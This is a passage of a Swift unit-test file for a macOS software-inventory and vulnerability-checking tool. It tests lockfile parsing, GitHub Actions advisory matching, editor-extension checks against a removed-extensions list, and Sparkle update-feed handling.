        expect(lastCheckText(now.addingTimeInterval(-20), now: now).hasSuffix("(just now)") && lastCheckText(now.addingTimeInterval(-300), now: now).hasSuffix("(5 minutes ago)"),
               "the last check reads its time and how long ago it was")

        // Security: downloads stop at their size limit instead of filling memory.
        let realConfiguration = Fetch.configuration
        let stubbed = URLSessionConfiguration.ephemeral
        stubbed.protocolClasses = [StubProtocol.self]
        Fetch.configuration = stubbed
        StubProtocol.responses = ["https://stub.test/ok": (200, ["Content-Type": "application/json"], Data("{\"a\":1}".utf8)),
                                  "https://stub.test/declared": (200, ["Content-Length": "20000000"], Data("{}".utf8)),
                                  "https://stub.test/endless": (200, [:], Data(count: 3_000_000))]
        let small = try await Fetch.json("https://stub.test/ok") as? [String: Int]
        expect(small == ["a": 1], "a normal response is returned")
        func failure(_ url: String) async -> String? { do { _ = try await Fetch.data(url, limit: 1_000_000); return nil } catch { return error.localizedDescription } }
        let declaredFailure = await failure("https://stub.test/declared"), endlessFailure = await failure("https://stub.test/endless"), missing = await failure("https://stub.test/missing")
        expect(declaredFailure == "Source exceeded response limit", "a declared size over the limit is refused before the body arrives")
        expect(endlessFailure == "Source exceeded response limit", "a response with no declared size is cut off once it passes the limit")
        expect(missing?.contains("404") == true, "an HTTP error is reported with its status")
        let plainHTTP = await failure("http://stub.test/ok")
        expect(plainHTTP == "Invalid source URL", "only https sources are fetched")
        StubProtocol.responses = ["https://registry.npmjs.org/playwright-core/latest": (200, [:], Data(#"{"name":"playwright-core","version":"1.64.1"}"#.utf8)),
                                  "https://raw.githubusercontent.com/microsoft/playwright/v1.64.1/packages/playwright-core/browsers.json": (200, [:], Data(
                                    #"{"browsers":[{"name":"chromium","revision":"1248","browserVersion":"156.0.8078.4"},{"name":"chromium-headless-shell","revision":"1248","browserVersion":"156.0.8078.4"},{"name":"ffmpeg","revision":"1013"}]}"#.utf8))]
        let newestPlaywright = try await Playwright.newest()
        expect(newestPlaywright == Playwright.Release(version: "1.64.1", browsers: ["chromium": "156.0.8078.4", "chromium_headless_shell": "156.0.8078.4"]),
               "Playwright's newest release and its browsers come from npm and the browsers.json at its tag")
        // Inside an app's update zip: a few small ranges read the bundled framework's version, not the whole download. A helper
        // app's framework isn't mistaken for the app's, and a server that would send the whole file is refused.
        let updateZip = TestZip.make([("Chat.app/Contents/Resources/app.asar", Data(count: 2_000_000), false),
                                      ("Chat.app/Contents/Frameworks/Chat Helper.app/Contents/Frameworks/Electron Framework.framework/Resources/Info.plist", TestZip.plist(["CFBundleVersion": "1.0.0"]), true),
                                      ("Chat.app/Contents/Frameworks/Electron Framework.framework/Versions/A/Resources/Info.plist", TestZip.plist(["CFBundleVersion": "45.2.2"]), true),
                                      ("Chat.app/Contents/Frameworks/Sparkle.framework/Versions/B/Resources/Info.plist", TestZip.plist(["CFBundleShortVersionString": "2.9.2 12-g0123456"]), false)])
        StubProtocol.ranged = ["https://stub.test/Chat-1.2.zip": updateZip]
        StubProtocol.responses = ["https://stub.test/whole.zip": (200, ["Content-Length": "150000000"], Data(count: 10))]
        StubProtocol.served = 0
        let peekedElectron = try await ReleasePeek.bundled("Electron Framework", in: "https://stub.test/Chat-1.2.zip")
        let peekedSparkle = try await ReleasePeek.bundled("Sparkle", in: "https://stub.test/Chat-1.2.zip")
        let wholeRefused = (try? await ReleasePeek.bundled("Electron Framework", in: "https://stub.test/whole.zip")) == nil
        expect(peekedElectron == ReleasePeek.Result(bundles: "45.2.2", modified: ISO8601DateFormatter().date(from: "2026-11-05T15:45:48Z")) && peekedSparkle.bundles == "2.9.2"
               && StubProtocol.served < 150_000 && updateZip.count > 2_000_000 && wholeRefused,
               "the bundled Electron and Sparkle versions are read from under 75 KB each of a 2 MB zip, with its date; a whole-file answer is refused")
        StubProtocol.ranged = [:]
        Fetch.configuration = realConfiguration

        // More project ecosystems: Swift, PHP, Dart and Flutter, .NET, Elixir and Gradle lockfiles.
        func parsed(_ file: String, _ text: String) -> [String] {
            (Lockfiles.parse("/p/" + file, data: Data(text.utf8))?.packages ?? []).map { "\($0.ecosystem) \($0.name) \($0.version) \($0.dependency ?? "-")" }
        }
        expect(parsed("Package.resolved", #"{"pins":[{"identity":"sparkle","kind":"remoteSourceControl","location":"https://github.com/sparkle-project/Sparkle","state":{"revision":"ac2d","version":"2.5.0"}},{"identity":"local","location":"https://github.com/me/branchy.git","state":{"branch":"main","revision":"ff00"}}],"version":3}"#)
               == ["SwiftURL github.com/sparkle-project/Sparkle 2.5.0 -"], "Package.resolved v3: keeps the URL's case, skips branch pins")
        expect(parsed("Package.resolved", #"{"object":{"pins":[{"package":"Vapor","repositoryURL":"git@github.com:vapor/vapor.git","state":{"version":"4.0.0"}}]},"version":1}"#)
               == ["SwiftURL github.com/vapor/vapor 4.0.0 -"], "Package.resolved v1 and git@ URLs")
        expect(Lockfiles.projectFolder("/w/App/App.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved") == "/w/App"
               && Lockfiles.projectFolder("/w/Lib/Package.resolved") == "/w/Lib", "Xcode's Package.resolved belongs to the folder holding the project")
        expect(parsed("composer.lock", #"{"packages":[{"name":"laravel/framework","version":"v8.0.0"},{"name":"acme/dev-only","version":"dev-main"}],"packages-dev":[{"name":"phpunit/phpunit","version":"9.5.0"}]}"#)
               == ["Packagist laravel/framework 8.0.0 -", "Packagist phpunit/phpunit 9.5.0 dev"], "composer.lock: v prefixes dropped, branch versions skipped, dev packages marked")
        let pubLock = """
        packages:
          http:
            dependency: "direct main"
            description:
              name: http
              url: "https://pub.dev"
            source: hosted
            version: "0.12.0"
          local_thing:
            dependency: "direct main"
            description:
              path: "../thing"
            source: path
            version: "1.0.0"
          meta:
            dependency: transitive
            source: hosted
            version: "1.9.1"
        sdks:
          dart: ">=3.0.0 <4.0.0"
        """
        expect(parsed("pubspec.lock", pubLock) == ["Pub http 0.12.0 direct", "Pub meta 1.9.1 transitive"], "pubspec.lock: hosted packages with their role; path packages skipped")
        expect(parsed("packages.lock.json", #"{"version":1,"dependencies":{"net8.0":{"Newtonsoft.Json":{"type":"Direct","requested":"[12.0.1, )","resolved":"12.0.1"},"System.Memory":{"type":"Transitive","resolved":"4.5.4"},"MyLib":{"type":"Project"}}}}"#)
               == ["NuGet Newtonsoft.Json 12.0.1 direct", "NuGet System.Memory 4.5.4 transitive"], "packages.lock.json: names keep their case; project references skipped")
        expect(parsed("mix.lock", "%{\n  \"plug\": {:hex, :plug, \"1.10.0\", \"abc\", [:mix], [], \"hexpm\", \"def\"},\n  \"mine\": {:git, \"https://x/y.git\", \"0123\", []},\n}")
               == ["Hex plug 1.10.0 -"], "mix.lock: Hex packages only")
        expect(parsed("gradle.lockfile", "# comment\ncom.fasterxml.jackson.core:jackson-databind:2.9.8=compileClasspath,runtimeClasspath\njunit:junit:4.12=testCompileClasspath,testRuntimeClasspath\nempty=annotationProcessor\n")
               == ["Maven com.fasterxml.jackson.core:jackson-databind 2.9.8 -", "Maven junit:junit 4.12 dev"], "gradle.lockfile: group:artifact names; test-only packages are dev")
        func routeFor(_ manager: String, _ ecosystem: String, _ name: String, file: String, location: String = "/w/app") -> String? {
            let item = Installation(product: "x", name: name, version: "1.0.0", path: file + "#" + name + "@1.0.0", domain: "projects", ecosystem: ecosystem, packageName: name,
                                    manager: manager, location: location, dependency: "direct", file: file)
            return Commands.commands(for: update(item, "2.0.0", kind: .security), context: .all).first?.text
        }
        expect(routeFor("swift", "SwiftURL", "github.com/sparkle-project/Sparkle", file: "/w/app/Package.resolved") == "cd /w/app && swift package update sparkle"
               && routeFor("swift", "SwiftURL", "github.com/sparkle-project/Sparkle", file: "/w/app/App.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved") == nil,
               "Swift packages update from Terminal; Xcode projects update from Xcode")
        expect(routeFor("composer", "Packagist", "laravel/framework", file: "/w/app/composer.lock") == "cd /w/app && composer update laravel/framework --with-dependencies"
               && routeFor("pub", "Pub", "http", file: "/w/app/pubspec.lock") == "cd /w/app && dart pub upgrade http"
               && routeFor("nuget", "NuGet", "Newtonsoft.Json", file: "/w/app/packages.lock.json") == "cd /w/app && dotnet add package Newtonsoft.Json --version 2.0.0"
               && routeFor("mix", "Hex", "plug", file: "/w/app/mix.lock") == "cd /w/app && mix deps.update plug", "each ecosystem gets its own update command")

        // GitHub Actions: every way a workflow can reference an action, and how each is judged.
        let workflow = """
        jobs:
          build:
            steps:
              - uses: actions/checkout@v4
              - uses: tj-actions/changed-files@v45.0.7
              - name: scan
                uses: "github/codeql-action/init@v3"
              - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
              - uses: some/thing@8e8c483db84b4bee98b60c0593521ed34d9990e8
              - uses: ./local-action
              - uses: docker://alpine:3
              - uses: owner/repo@main
        """
        expect(parsed(".github/workflows/ci.yml", workflow) == ["GitHub Actions actions/checkout v4 -", "GitHub Actions actions/setup-node v4.2.0 (commit 1d0ff46) -",
                                                                 "GitHub Actions github/codeql-action v3 -", "GitHub Actions owner/repo main -",
                                                                 "GitHub Actions some/thing commit 8e8c483 -", "GitHub Actions tj-actions/changed-files v45.0.7 -"],
               "workflow uses: lines become actions; local actions and Docker images are skipped; pinned commits keep their version comment")
        expect(Lockfiles.projectFolder("/w/app/.github/workflows/ci.yml") == "/w/app", "a workflow belongs to the project holding .github")
        let changedFiles = try JSONSerialization.jsonObject(with: Data(#"{"vulns":[{"id":"GHSA-mrrh-fwg8-r2c3","summary":"tj-actions changed-files through 45.0.7 allows remote attackers to discover secrets","aliases":["CVE-2025-30066"],"database_specific":{"severity":"HIGH"},"affected":[{"package":{"ecosystem":"GitHub Actions","name":"tj-actions/changed-files"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"46.0.1"}]}]}]},{"id":"GHSA-same-major","summary":"fixed within 3.x","affected":[{"package":{"name":"tj-actions/changed-files"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"3.0.0"},{"fixed":"3.2.1"}]}]}]}]}"#.utf8)) as! [String: Any]
        let changedAdvisories = GitHubActions.advisories(changedFiles, name: "tj-actions/changed-files")
        func judged(_ ref: String) -> String? {
            let item = Installation(product: "x", name: "tj-actions/changed-files", version: ref, path: "/w/app/.github/workflows/ci.yml#x", domain: "projects",
                                    ecosystem: "GitHub Actions", packageName: "tj-actions/changed-files", manager: "actions", location: "/w/app", file: "/w/app/.github/workflows/ci.yml")
            return GitHubActions.finding(item, advisories: changedAdvisories).map { "\($0.fixed) \($0.severity ?? "-") \($0.reason.contains("moving tag") ? "moving" : "exact")" }
        }
        expect(judged("v45.0.7") == "46.0.1 HIGH exact" && judged("45.0.7") == "46.0.1 HIGH exact", "an exact affected version gets the fix")
        expect(judged("v45") == "46.0.1 HIGH moving", "a moving major tag with no fix in that major is affected and says why")
        expect(judged("v46") == nil && judged("v46.0.1") == nil, "a moving tag whose major contains the fix, and the fixed release, are not flagged")
        expect(judged("v3") == "46.0.1 HIGH moving" && judged("v2.9.0") == "46.0.1 HIGH exact",
               "a fix inside the same major clears that advisory for the moving tag; earlier versions still hit the open-ended one")
        expect(judged("commit 8e8c483") == nil && judged("main") == nil && judged("v44.5.1 (commit 1234567)") == "46.0.1 HIGH exact",
               "bare commits and branches can't be judged; a commit's version comment can")
        expect(routeFor("actions", "GitHub Actions", "tj-actions/changed-files", file: "/w/app/.github/workflows/ci.yml").map { $0.hasPrefix("Open ci.yml") } == true,
               "an affected action opens its workflow file to change")

        // Tools installed outside Homebrew: cargo install, Ruby gems and go install programs.
        let cargoRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-cargo-\(UUID().uuidString)").path
        try FileManager.default.createDirectory(atPath: cargoRoot + "/bin", withIntermediateDirectories: true)
        try Data(#"{"installs":{"ripgrep 13.0.0 (registry+https://github.com/rust-lang/crates.io-index)":{"bins":["rg"]},"mine 0.1.0 (path+file:///Users/a/mine)":{"bins":["mine"]}}}"#.utf8)
            .write(to: URL(fileURLWithPath: cargoRoot + "/.crates2.json"))
        let crates = Inventory.cargoInstalls(root: cargoRoot)
        expect(crates.map { "\($0.name) \($0.version) \($0.ecosystem ?? "")" } == ["ripgrep 13.0.0 crates.io"], "cargo install: crates.io installs only")
        expect(Commands.commands(for: update(crates[0], "14.0.0", kind: .security)).first?.text == "cargo install ripgrep --locked", "cargo installs update by reinstalling")
        try? FileManager.default.removeItem(atPath: cargoRoot)
        expect(Inventory.gemSpec("rspec-core-3.12.0.gemspec")! == ("rspec-core", "3.12.0") && Inventory.gemSpec("nokogiri-1.15.4-arm64-darwin.gemspec")! == ("nokogiri", "1.15.4")
               && Inventory.gemSpec("net-imap-0.4.9.1.gemspec")! == ("net-imap", "0.4.9.1") && Inventory.gemSpec("README.md") == nil, "gemspec names: hyphenated names, platforms and four-part versions")
        let gemItem = Installation(product: "rubygems:net-imap", name: "net-imap", version: "0.4.9", path: "/opt/homebrew/lib/ruby/gems/3.4.0/specifications/default/net-imap-0.4.9.gemspec",
                                   domain: "packages", ecosystem: "RubyGems", packageName: "net-imap", manager: "gem", location: "/opt/homebrew/opt/ruby/bin/gem")
        expect(Commands.commands(for: update(gemItem, "0.4.20", kind: .security)).first?.text == "/opt/homebrew/opt/ruby/bin/gem update net-imap", "a gem updates with its own Ruby's gem")
        // Ruby loads the newest copy of a gem; older copies, including a default gem a newer install replaced, aren't checked.
        let gemRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-gems-\(UUID().uuidString)").path, gemHome = gemRoot + "/lib/ruby/gems/4.0.0"
        for folder in ["specifications", "specifications/default"] { try FileManager.default.createDirectory(atPath: gemHome + "/" + folder, withIntermediateDirectories: true) }
        for file in ["specifications/json-3.1.0.gemspec", "specifications/json-2.19.0.gemspec", "specifications/default/json-2.18.0.gemspec", "specifications/default/psych-5.2.0.gemspec",
                     "specifications/default/rake-13.0.0.gemspec", "specifications/rake-13.0.0.gemspec", "specifications/nokogiri-1.15.4-arm64-darwin.gemspec", "specifications/nokogiri-1.16.0-arm64-darwin.gemspec"] {
            try Data().write(to: URL(fileURLWithPath: gemHome + "/" + file))
        }
        expect(Inventory.gems(in: gemHome, gem: nil).map { "\($0.name) \($0.version) \(($0.path as NSString).lastPathComponent)\($0.path.contains("/default/") ? " default" : "")" }
               == ["json 3.1.0 json-3.1.0.gemspec", "nokogiri 1.16.0 nokogiri-1.16.0-arm64-darwin.gemspec", "psych 5.2.0 psych-5.2.0.gemspec default", "rake 13.0.0 rake-13.0.0.gemspec"],
               "only the newest copy of each gem is checked; a default gem counts only while nothing newer is installed")
        try? FileManager.default.removeItem(atPath: gemRoot)
        let goOutput = "/Users/a/go/bin/gopls: go1.22.0\n\tpath\tgolang.org/x/tools/gopls\n\tmod\tgolang.org/x/tools/gopls\tv0.15.0\th1:abc\n\tdep\tgolang.org/x/net\tv0.20.0\th1:def\n\tbuild\t-compiler=gc\n/Users/a/go/bin/dev: go1.22.0\n\tpath\texample.com/dev\n\tmod\texample.com/dev\t(devel)\t\n"
        let goItems = Inventory.goModules(goOutput)
        expect(goItems.map { "\($0.name) \($0.version) \($0.dependency ?? "")" } == ["golang.org/x/tools/gopls 0.15.0 direct", "golang.org/x/net 0.20.0 transitive"],
               "go version -m: the program's module and the modules built into it; development builds skipped")
        expect(Commands.commands(for: update(goItems[1], "0.23.0", kind: .security)).first?.text == "go install golang.org/x/tools/gopls@latest",
               "a vulnerable module inside a Go program is fixed by reinstalling the program")

        // Editor extensions, checked against Microsoft's list of extensions removed from its marketplace.
        let filler = (0..<120).map { "| filler.ext\($0) | 1/1/2025 | Spam |" }.joined(separator: "\n")
        let removedList = try EditorExtensions.removed("| Extension Identifier | Removal Date | Type |\n|---|---|---|\n| Evil.Theme | 10/24/2026 | Malware |\n| fake.prettier | 10/23/2026 | Impersonation |\n| junk.ads | 10/22/2026 | Spam |\n" + filler)
        expect(removedList["evil.theme"]?.reason == "Malware" && removedList["fake.prettier"]?.date == "10/23/2026", "the removed list is read, case-insensitively")
        expect((try? EditorExtensions.removed("<html>moved</html>")) == nil, "a page that isn't the list fails the check instead of reading as nothing removed")
        let extRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-ext-\(UUID().uuidString)").path
        for (folder, id) in [("vscode/evil.theme-1.0.0", ("Evil", "theme")), ("vscode/junk.ads-2.0.0", ("junk", "ads")), ("cursor/fake.prettier-3.0.0", ("fake", "prettier"))] {
            try FileManager.default.createDirectory(atPath: extRoot + "/" + folder, withIntermediateDirectories: true)
            try Data(#"{"publisher":"\#(id.0)","name":"\#(id.1)","version":"\#(folder.split(separator: "-").last!)"}"#.utf8).write(to: URL(fileURLWithPath: extRoot + "/" + folder + "/package.json"))
        }
        try Data("[]".utf8).write(to: URL(fileURLWithPath: extRoot + "/vscode/extensions.json"))
        let installedExtensions = Inventory.editorExtensions(roots: [("VS Code", extRoot + "/vscode", "/usr/bin/true"), ("Cursor", extRoot + "/cursor", extRoot + "/missing-cli")])
        expect(installedExtensions.map { "\($0.package!) \($0.name) \($0.version)" }.sorted() == ["Cursor fake.prettier 3.0.0", "VS Code Evil.theme 1.0.0", "VS Code junk.ads 2.0.0"],
               "extensions are read from each editor's folder by publisher.name")
        let extensionFindings = EditorExtensions.findings(installedExtensions, removed: removedList)
        let evilExtension = extensionFindings.first { $0.installation.name == "Evil.theme" }, fake = extensionFindings.first { $0.installation.name == "fake.prettier" }
        expect(extensionFindings.count == 2 && evilExtension?.malicious == true && evilExtension?.severity == "CRITICAL" && fake?.severity == "HIGH" && fake?.malicious == nil
               && fake?.reason.contains("Open VSX") == true, "malware is critical; impersonation is high; spam is ignored; Open VSX editors carry the caveat")
        expect(Commands.commands(for: evilExtension!).first?.text == "/usr/bin/true --uninstall-extension Evil.theme"
               && Commands.commands(for: fake!).first?.text == "rm -rf " + Shell.quote(extRoot + "/cursor/fake.prettier-3.0.0"), "uninstall with the editor's tool, or delete the folder when it isn't installed")
        try? FileManager.default.removeItem(atPath: extRoot)

        // Sparkle: self-updating apps' own feeds, and the Sparkle framework bundled inside apps.
        let appcast = Data("""
        <?xml version="1.0" encoding="utf-8"?>
        <rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle">
          <channel>
            <item><title>2.0.4</title><sparkle:version>111</sparkle:version><sparkle:shortVersionString>2.0.4</sparkle:shortVersionString>
              <sparkle:minimumSystemVersion>14.0</sparkle:minimumSystemVersion><enclosure url="https://example.com/a.zip" length="1" type="application/octet-stream"/></item>
            <item><title>2.1 beta</title><sparkle:version>120</sparkle:version><sparkle:shortVersionString>2.1b1</sparkle:shortVersionString><sparkle:channel>beta</sparkle:channel>
              <enclosure url="https://example.com/b.zip"/></item>
            <item><title>Windows</title><enclosure url="https://example.com/w.exe" sparkle:version="130" sparkle:os="windows"/></item>
            <item><title>2.0.3</title><enclosure url="https://example.com/c.zip" sparkle:version="110" sparkle:shortVersionString="2.0.3"/></item>
          </channel>
        </rss>
        """.utf8)
        let feedReleases = SparkleFeeds.releases(appcast)
        expect(feedReleases == [SparkleFeeds.Release(build: "111", version: "2.0.4", minimumSystem: "14.0", url: "https://example.com/a.zip"),
                                SparkleFeeds.Release(build: "110", version: "2.0.3", minimumSystem: nil, url: "https://example.com/c.zip")],
               "appcast items in both layouts, with their downloads; beta channels and other platforms skipped")
        expect(SparkleFeeds.newest(feedReleases, system: "Version 27.0 (Build 27A1)")?.version == "2.0.4" && SparkleFeeds.newest(feedReleases, system: "Version 13.6 (Build 22G1)")?.version == "2.0.3",
               "releases needing a newer macOS are skipped")
        expect(SparkleFeeds.releases(Data("<rss><item>".utf8)).isEmpty, "a broken feed yields nothing")
        let feedApp = Installation(product: "app:com.example.rect", name: "Rectangle", version: "0.94", path: "/Applications/Rectangle.app", domain: "apps", manager: "app", build: "100", feed: "https://example.com/updates.xml")
        let feedFinding = SparkleFeeds.finding(feedApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)")
        expect(feedFinding?.fixed == "2.0.4" && feedFinding?.kind == .update && feedFinding?.reason.contains("(build 111)") == true
               && Commands.commands(for: feedFinding!).first.map { $0.kind == "app" && $0.text == "Open Rectangle" } == true, "an older build gets an update that opens the app's own updater")
        var currentApp = feedApp; currentApp.build = "111"
        expect(SparkleFeeds.finding(currentApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)") == nil, "an app at the feed's newest build has no update")
        expect(Inventory.trimmedSparkleVersion("1.27.1-3-g05be1d71") == "1.27.1" && Inventory.trimmedSparkleVersion("1.22.0 1354-g4e0506a") == "1.22.0"
               && Inventory.trimmedSparkleVersion("2.7.0-beta.1") == "2.7.0-beta.1" && Inventory.trimmedSparkleVersion("2.10.0") == "2.10.0", "bundled Sparkle versions lose build suffixes, keep prerelease tags")
        let appsRoot = FileManager.default.temporaryDirectory.appendingPathComponent("shipshape-apps-\(UUID().uuidString)").path
        func makeApp(_ name: String, _ info: [String: String], sparkle: String? = nil, appStore: Bool = false) throws {
            let contents = appsRoot + "/" + name + ".app/Contents"
            try FileManager.default.createDirectory(atPath: contents, withIntermediateDirectories: true)
            try PropertyListSerialization.data(fromPropertyList: info, format: .xml, options: 0).write(to: URL(fileURLWithPath: contents + "/Info.plist"))
            if let sparkle {
                let resources = contents + "/Frameworks/Sparkle.framework/Versions/A/Resources"
                try FileManager.default.createDirectory(atPath: resources, withIntermediateDirectories: true)
                try PropertyListSerialization.data(fromPropertyList: ["CFBundleShortVersionString": sparkle], format: .xml, options: 0).write(to: URL(fileURLWithPath: resources + "/Info.plist"))
            }
            if appStore { try FileManager.default.createDirectory(atPath: contents + "/_MASReceipt", withIntermediateDirectories: true); try Data().write(to: URL(fileURLWithPath: contents + "/_MASReceipt/receipt")) }
        }
        try makeApp("Tidy", ["CFBundleIdentifier": "com.example.tidy", "CFBundleShortVersionString": "1.2", "CFBundleVersion": "42", "SUFeedURL": "https://example.com/tidy.xml"], sparkle: "1.27.1-3-g05be1d71")
        try makeApp("Plain", ["CFBundleIdentifier": "com.example.plain", "CFBundleShortVersionString": "3.0", "SUFeedURL": "http://example.com/plain.xml"])
        try makeApp("Store", ["CFBundleIdentifier": "com.example.store", "CFBundleShortVersionString": "1.0", "SUFeedURL": "https://example.com/s.xml"], sparkle: "2.0.0", appStore: true)
        try makeApp("Applet", ["CFBundleName": "Applet", "CFBundleExecutable": "applet"])
        let (sparkleApps, _, appStoreSkipped, appSignatures, unreadableApps) = Inventory.apps(roots: [appsRoot])
        expect(sparkleApps.map { "\($0.name) \($0.version) \($0.manager!) \($0.build ?? "-") \($0.feed ?? "-")" }
               == ["Tidy 1.2 app 42 https://example.com/tidy.xml", "Sparkle in Tidy 1.27.1 sparkle-framework - -"] && appStoreSkipped == 1,
               "apps with an https feed or a bundled Sparkle are kept; an http feed alone isn't; App Store apps are skipped")
        expect(appSignatures.map { "\($0.name) \($0.kind.rawValue)" }.sorted() == ["Applet unsigned", "Plain unsigned", "Tidy unsigned"] && unreadableApps == 0,
               "every app's signature is read, inventoried or not and with or without a bundle ID, except App Store apps; a bundle with no code reads as unsigned")
        let bundled = update(sparkleApps[1], "2.9.2", kind: .security)
        expect(Commands.commands(for: bundled).first.map { $0.kind == "app" && $0.text == "Open Tidy" && $0.target?.hasSuffix("/Tidy.app") == true } == true
               && Commands.action(for: sparkleApps[1], malicious: false, fixed: "2.9.2").hasPrefix("Update Tidy to a release that bundles Sparkle 2.9.2 or later"),
               "a vulnerable bundled Sparkle is fixed by updating the app that contains it")
        expect(sparkleApps[1].note.contains("a modified Sparkle build, 1.27.1 plus 3 changes"), "a Sparkle with changes on top of a release says so on its card")
        expect(Inventory.sparkleChanges("1.22.0 1354-g4e0506a") == 1354 && Inventory.sparkleChanges("1.27.1-3-g05be1d71") == 3
               && Inventory.sparkleChanges("2.7.0-beta.1") == nil && Inventory.sparkleChanges("2.10.0") == nil, "build suffixes give the number of changes; releases and prereleases have none")
        // Codex sets its feed in code, not in Info.plist; the catalog names its public feed.
        try makeApp("ChatGPT", ["CFBundleIdentifier": "com.openai.codex", "CFBundleName": "ChatGPT", "CFBundleShortVersionString": "26.1021.31345", "CFBundleVersion": "21828"], sparkle: "2.9.1")
        let codexApp = Inventory.apps(roots: [appsRoot]).0.first { $0.product == "codex-app" }
        expect(codexApp?.name == "Codex" && codexApp?.feed == "https://persistent.oaistatic.com/codex-app-prod/appcast.xml"
               && Catalog.products.allSatisfy { $0.feed?.hasPrefix("https://") ?? true }, "a catalog app that sets its feed in code gets its public feed from the catalog")
        try? FileManager.default.removeItem(atPath: appsRoot)

        // Bundled Sparkle in an app that is already current: nothing to install until the developer ships a fix.
        let sparkleItem = Installation(product: "swifturl:github.com/sparkle-project/Sparkle", name: "Sparkle in Folx", version: "1.20.0", path: "/Applications/Folx.app/Contents/Frameworks/Sparkle.framework",
                                       domain: "apps", ecosystem: "SwiftURL", packageName: "github.com/sparkle-project/Sparkle", manager: "sparkle-framework", location: "/Applications/Folx.app")
        let sparkleTarget = "SwiftURL|github.com/sparkle-project/Sparkle"
        let sparkleVulns = ["GHSA-a": OSV.Vuln(id: "GHSA-a", summary: "Signing checks bypass", aliases: [], severity: "HIGH", fixed: [sparkleTarget: ["2.6.4"]]),
                            "GHSA-b": OSV.Vuln(id: "GHSA-b", summary: "XPC listener accepts unvalidated connections", aliases: [], severity: "MODERATE", fixed: [:])]
        var sparkleFindings = OSV.findings(for: [sparkleItem], matches: [OSV.key(sparkleItem)!: ["GHSA-a", "GHSA-b"]], vulns: sparkleVulns)
        expect(sparkleFindings.first?.reason == "2 published advisories: Signing checks bypass; XPC listener accepts unvalidated connections. 1 has no published fix.",
               "advisory titles end with a period before the count of advisories with no fix")
        expect(SparkleFeeds.current(currentApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)") && !SparkleFeeds.current(feedApp, releases: feedReleases, system: "Version 27.0 (Build 27A1)")
               && !SparkleFeeds.current(currentApp, releases: [], system: "Version 27.0 (Build 27A1)"), "an app is current only when its feed offers nothing newer")
        var otherApps = sparkleFindings
        Scanner.markBundledAwaiting(&otherApps, currentApps: ["/Applications/Rectangle.app"])
        expect(otherApps.first?.awaitingFix == true && Commands.commands(for: otherApps[0]).isEmpty
               && otherApps[0].action.hasPrefix("Shipshape can't see whether a newer Folx is out, because it couldn't find or read Folx's update feed."),
               "an app whose feed can't be read waits instead of needing attention, and the card says Shipshape can't see")
        Scanner.markBundledAwaiting(&sparkleFindings, currentApps: ["/Applications/Folx.app"])
        let waitingSparkle = sparkleFindings[0]
        expect(waitingSparkle.awaitingFix == true && waitingSparkle.fixed == "2.6.4, not in Folx yet" && waitingSparkle.action.hasPrefix("You have the newest Folx, and it still bundles Sparkle 1.20.0")
               && Commands.commands(for: waitingSparkle).isEmpty, "a current app's bundled Sparkle has no button and says only the developer can fix it")
        expect(ScanReport(findings: sparkleFindings).security.isEmpty && ScanReport(findings: sparkleFindings).awaiting.count == 1, "it waits in No fix released yet instead of counting as needing attention")
        let freshSparkle = OSV.findings(for: [sparkleItem], matches: [OSV.key(sparkleItem)!: ["GHSA-a", "GHSA-b"]], vulns: sparkleVulns)
        var unreadFeed = freshSparkle
        Scanner.markBundledAwaiting(&unreadFeed, currentApps: [])
        expect(unreadFeed[0].awaitingFix == true && unreadFeed[0].fixed == waitingSparkle.fixed && unreadFeed[0].action.hasPrefix("Shipshape can't see whether a newer Folx is out"),
               "a waiting Sparkle keeps waiting when nothing shows a newer release, such as an unreadable feed, without claiming the app is current")
        let folxUpdate = Finding(source: "sparkle-feed", installation: Installation(product: "app:folx", name: "Folx", version: "5.30", path: "/Applications/Folx.app", domain: "apps", manager: "app"),
                                 kind: .update, fixed: "5.31", reason: "", action: "", links: [])
        var folxReleased = freshSparkle + [folxUpdate], folxBothSources = freshSparkle + [folxUpdate]
        Scanner.markBundledAwaiting(&folxReleased, currentApps: [])
        Scanner.markBundledAwaiting(&folxBothSources, currentApps: ["/Applications/Folx.app"])
        expect(folxReleased[0].awaitingFix == nil && Commands.commands(for: folxReleased[0]).first?.text == "Open Folx" && folxBothSources[0].awaitingFix == nil
               && folxReleased[0].action == freshSparkle[0].action,
               "a newer release of the app ends the wait, even if another source calls the app current")
        let itermSparkle = Finding(source: "osv", installation: Installation(product: "swifturl:github.com/sparkle-project/Sparkle", name: "Sparkle in iTerm2", version: "1.22.0", path: "/Applications/iTerm.app/Contents/Frameworks/Sparkle.framework",
                                                                             domain: "apps", ecosystem: "SwiftURL", packageName: "github.com/sparkle-project/Sparkle", manager: "sparkle-framework", location: "/Applications/iTerm.app"),
                                   kind: .security, fixed: "2.6.4", reason: "", action: "", links: [])
        let itermFix = Finding(source: "nvd:iterm2", installation: Installation(product: "iterm2", name: "iTerm2", version: "3.5.0", path: "/Applications/iTerm.app", domain: "apps", manager: "app"),
                               kind: .security, fixed: "3.5.1", reason: "", action: "", links: [])
        var itermFindings = [itermFix, itermSparkle]
        Scanner.markBundledAwaiting(&itermFindings, currentApps: [])
        expect(itermFindings[1].awaitingFix == nil, "a fixed release of the app itself also counts as a newer release")

        // A newer release counts once the app's own updater has had time to offer it: a week, or a whole phased rollout.
        let datedFeed = Data("""
        <rss xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle"><channel><pubDate>Mon, 01 Jan 2024 00:00:00 +0000</pubDate>
          <item><title>New</title><pubDate>Wed, 28 Oct 2026 00:27:10 +0000</pubDate><sparkle:version>22530</sparkle:version><sparkle:shortVersionString>26.1023.51421</sparkle:shortVersionString>
            <sparkle:hardwareRequirements>arm64</sparkle:hardwareRequirements><enclosure url="https://example.com/n.zip"/></item>
